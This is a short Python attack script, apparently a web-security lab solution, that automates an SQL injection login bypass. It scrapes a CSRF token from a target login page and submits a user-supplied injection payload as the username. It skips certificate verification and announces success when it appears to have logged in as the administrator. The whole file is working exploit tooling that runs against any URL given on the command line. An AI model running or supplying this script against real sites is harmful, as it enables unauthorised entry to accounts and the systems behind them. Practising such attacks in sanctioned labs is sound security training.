import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = sys.argv[1].strip()

def get_csrf_token(s):
    r = s.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def error_based():
    s = requests.Session()
    print("Enter the payload to exploit: ")
    payload = input()
    csrf = get_csrf_token(s)
    data = {"csrf": csrf,
            "username": payload,
            "password": "abcxyz"}
    r = s.post(url, data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    if  error_based():
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')